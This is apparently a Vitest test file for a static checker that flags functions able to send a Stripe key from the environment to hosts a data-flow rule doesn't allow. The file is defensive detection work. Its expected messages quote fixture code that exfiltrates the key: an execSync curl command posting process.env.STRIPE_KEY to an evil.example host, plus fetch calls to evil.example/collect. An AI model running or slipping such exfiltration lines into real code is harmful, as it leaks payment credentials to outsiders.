// Data-flow rules: "env(STRIPE_KEY) may only go to net(api.stripe.com)". A function that
// gets hold of the source (reads it, or calls something that reads it and can hand it
// back) and can send to any other host, run a command, or run code that can't be
// verified, directly or through what it calls, fails. It doesn't follow the value itself.

import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { checkFiles, type CheckOptions } from "../src/check.js";
import { parseFlows } from "../src/flows.js";

const app = fileURLToPath(new URL("./flows-fixtures/app.ts", import.meta.url));
const stripeRule = { from: { name: "env", arg: "STRIPE_KEY" }, to: [{ name: "net", arg: "api.stripe.com" }] };
const run = (options: CheckOptions = {}) => checkFiles([app], { flows: [stripeRule], ...options });
const flows = (options: CheckOptions = {}) => run(options).diagnostics.filter((d) => d.code === "PERM009");
const message = (fn: string) => flows().find((d) => d.function === fn)!;

describe("data-flow rules", () => {
  it("fails functions that get the source and can send it somewhere the rule doesn't allow", () => {
    expect(flows().map((d) => `${d.severity} ${d.function}:${d.line} ${d.capability}`)).toEqual([
      "error charge:8 net(analytics.example)",
      "error relay:18 net",
      "error dumpAll:23 net(logs.example)",
      "error dashboard:44 net(analytics.example)",
      "error viaGetter:56 net(evil.example)",
      "error viaField:65 net(evil.example)",
      "error viaCallback:74 net(evil.example)",
      "error viaClient:84 net(evil.example)",
      "error viaExec:89 exec",
      "error viaEval:94 unverifiable",
    ]);
  });

  it("says what was read, where it can go, and the path to it", () => {
    const charge = message("charge");
    expect(charge.message).toBe(
      "charge reads env(STRIPE_KEY) and can send to net(analytics.example), through track → fetch(\"https://analytics.example/event\", ...), which the flow rule for env(STRIPE_KEY) doesn't allow.",
    );
    expect(charge.fix).toBe("keep env(STRIPE_KEY) away from that call, or add net(analytics.example) to the rule's \"to\" in permlang.config.json.");
    expect(message("relay").message).toContain("can send to net (a host that can't be determined)");
  });

  it("follows the source through a getter, a function in a field, a callback, or an object built with it", () => {
    expect(message("viaGetter").message).toBe(
      "viaGetter gets env(STRIPE_KEY) from stripeKey and can send to net(evil.example), through fetch(\"https://evil.example/collect\", ...), which the flow rule for env(STRIPE_KEY) doesn't allow.",
    );
    expect(message("viaField").message).toContain("viaField gets env(STRIPE_KEY) from Keys.stripe and can send to net(evil.example)");
    expect(message("viaCallback").message).toMatch(/^viaCallback gets env\(STRIPE_KEY\) from withKey and can send to net\(evil\.example\)/);
    expect(message("viaClient").message).toMatch(/^viaClient gets env\(STRIPE_KEY\) from StripeClient\.constructor and can send/);
  });

  it("treats a command, or code that can't be verified, as able to send it anywhere", () => {
    expect(message("viaExec").message).toBe(
      "viaExec reads env(STRIPE_KEY) and can run commands, through execSync(\"curl -d \" + process.env.STRIPE_KEY + \" https://evil.exam...), which could send it anywhere: the flow rule for env(STRIPE_KEY) allows only net(api.stripe.com).",
    );
    expect(message("viaExec").fix).toBe("keep env(STRIPE_KEY) away from that call: no rule can allow it, since a command could send it anywhere.");
    expect(message("viaEval").message).toContain("runs code that can't be verified, through eval(");
    const nowhere = { from: stripeRule.from, to: [] };
    expect(flows({ flows: [nowhere] }).find((d) => d.function === "viaExec")!.message).toContain("the flow rule for env(STRIPE_KEY) doesn't let it go anywhere.");
  });

  it("allows the hosts the rule lists, and ignores functions that never have the source", () => {
    const functions = flows().map((d) => d.function);
    expect(functions).not.toContain("stripeOnly");
    expect(functions).not.toContain("other");
    expect(functions).not.toContain("track");
    // They read the key, but send it nowhere else.
    expect(functions).not.toContain("stripeKey");
    expect(functions).not.toContain("withKey");
    expect(functions).not.toContain("chargeOnly");
    // It calls chargeOnly, which uses the key but returns nothing and takes no callback.
    expect(functions).not.toContain("checkout");
    // It calls one that returns void or Promise<void>, which can't hand the key back either.
    expect(functions).not.toContain("refund");
    // It assigns to a setter that uses the key: a setter returns nothing.
    expect(functions).not.toContain("configure");
  });

  // Found in review: sketch, which init sets up, turned these into warnings, so a broken rule passed.
  it("fails at every strictness level, sketch included", () => {
    expect(flows({ strictness: "sketch" }).map((d) => d.severity)).toEqual(Array(10).fill("error"));
  });

  it("checks nothing without rules", () => {
    expect(checkFiles([app]).diagnostics.filter((d) => d.code === "PERM009")).toEqual([]);
  });

  it("can take a whole category as the source", () => {
    const anyEnv = { from: { name: "env" }, to: [{ name: "net", arg: "api.stripe.com" }] };
    expect(flows({ flows: [anyEnv] }).map((d) => d.function)).toContain("other");
  });
});

describe("data-flow rules in permlang.config.json", () => {
  const parse = (raw: unknown) => parseFlows(raw, "permlang.config.json");

  it("are read and validated by the CLI", () => {
    expect(parse([{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com)"] }])).toEqual([stripeRule]);
    expect(() => parse([{ from: "env(STRIPE_KEY)" }])).toThrow(/"to" must be a list/);
    expect(() => parse([{ from: "nonsense(", to: [] }])).toThrow(/invalid "from"/);
    expect(() => parse("x")).toThrow(/"flows" must be a list/);
    expect(path.basename(app)).toBe("app.ts");
  });

  it("take environment variables, files, tables, and hosts' responses as sources", () => {
    for (const from of ["env", "env(STRIPE_KEY)", "fs.read(./secrets)", "db.read(customers)", "net(api.internal.example)"]) {
      expect(parse([{ from, to: ["net(api.stripe.com)"] }])).toHaveLength(1);
    }
  });

  // Found in review: these were accepted and then never matched anything.
  it.each([
    [{ from: "env(STRIPE_KEY)", to: ["fs.write(./public)"] }, /flows\[0\]: "to" can only list network hosts, such as "net\(api\.stripe\.com\)"; "fs\.write\(\.\/public\)" isn't one\./],
    [{ from: "env(STRIPE_KEY)", to: ["env(OTHER)"] }, /"to" can only list network hosts/],
    [{ from: "env(STRIPE_KEY)", to: ["exec"] }, /"to" can only list network hosts/],
    [{ from: "exec", to: [] }, /flows\[0\]: "from" must be data a function can read: env, fs\.read, db\.read, or net, with or without a scope; "exec" isn't\./],
    [{ from: "fs.write(./out)", to: [] }, /"from" must be data a function can read/],
    [{ from: "db.write(users)", to: [] }, /"from" must be data a function can read/],
    [{ from: "env(STRIPE_KEY)", to: ["net(api.stripe.com)"], too: ["net(evil.example)"] }, /flows\[0\] has an unknown setting "too"; a rule has only "from" and "to"\./],
  ])("rejects %j", (rule, reason) => {
    expect(() => parse([rule])).toThrow(reason);
  });
});
